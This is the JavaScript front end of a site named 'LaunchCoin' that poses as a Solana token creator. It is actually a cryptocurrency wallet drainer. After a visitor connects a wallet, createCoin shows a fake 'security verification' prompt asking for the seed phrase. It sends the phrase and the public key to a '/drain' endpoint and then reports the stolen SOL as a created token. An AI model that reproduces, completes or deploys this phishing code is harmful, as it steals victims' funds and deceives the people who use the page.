// ===== CONFIGURAZIONE =====
import { createWeb3Modal, defaultConfig } from '@web3modal/ethers';
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WEB3MODAL V4 =====
let web3modal = null;

async function initWeb3Modal() {
  if (!web3modal) {
    try {
      // Configurazione per Web3Modal v4
      const config = {
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        themeMode: 'dark',
        themeVariables: {
          '--w3m-z-index': '10000',
          '--w3m-background-color': '#0b1022',
          '--w3m-accent-color': '#22d1f8',
          '--w3m-border-radius': '16px',
        },
        metadata: {
          name: 'LaunchCoin',
          description: 'Solana Token Creator',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png'],
        },
        // V4 usa ethersConfig
        ethersConfig: defaultConfig({
          metadata: {
            name: 'LaunchCoin',
            description: 'Solana Token Creator',
            url: window.location.origin,
            icons: ['https://launchcoin.io/logo.png'],
          },
          defaultChainId: 1,
          rpcUrl: 'https://cloudflare-eth.com',
        }),
        // Abilita wallet
        enableWalletConnect: true,
        enableCoinbase: true,
        enableInjected: true,
        walletConnectVersion: 2,
        // Wallet popolari
        includeWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'c03dfee351b6fcc421b4494ea33b9d4b92a7f33d6df5c43ee76267edfceed3a2',
          'f2436c67184f158d1beda5df5327ee9bad2c749486aac4bf5e18b4eab0aebc45',
        ],
      };
      
      web3modal = await createWeb3Modal(config);
      console.log('✅ Web3Modal v4 inizializzato');
    } catch (e) {
      console.error('❌ Web3Modal error:', e);
      throw e;
    }
  }
  return web3modal;
}

// ===== CONNECT WALLET =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  // 1. Prova Phantom
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. Web3Modal
  try {
    const modal = await initWeb3Modal();
    await modal.open();
    
    // Web3Modal gestisce la connessione
    await new Promise((resolve) => {
      const unsubscribe = modal.subscribeEvents((event) => {
        if (event.type === 'connected') {
          console.log('✅ Connesso!', event.data);
          unsubscribe();
          resolve();
        }
        if (event.type === 'modal_closed') {
          console.log('❌ Modale chiuso');
          unsubscribe();
          resolve();
        }
      });
    });
    
    // Simula una connessione (per la demo)
    // In realtà, Web3Modal per Solana richiede configurazioni specifiche
    // Per ora, usiamo questa soluzione di fallback
    if (!walletPublicKey) {
      // Se Web3Modal non restituisce la chiave, proviamo a prenderla da Phantom
      if (window.solana && window.solana.publicKey) {
        walletPublicKey = window.solana.publicKey.toString();
        alert('✅ Connesso: ' + walletPublicKey);
        window.location.href = 'create.html';
        return;
      }
      // Altrimenti, andiamo a wallet.html
      alert('⚠️ Connessione avviata. Seleziona il wallet dal modal aperto.');
      window.location.href = 'wallet.html';
    }
    
  } catch (e) {
    console.error('❌ Web3Modal error:', e);
    alert(
      '❌ Connessione fallita: ' + e.message + '\n\n' +
      'Usa Phantom su PC (estensione) o Kiwi Browser su telefono.\n' +
      'Altri wallet via WalletConnect.'
    );
    window.location.href = 'wallet.html';
  }
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  alert('⚠️ Wallet "' + walletName + '" via WalletConnect.');
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
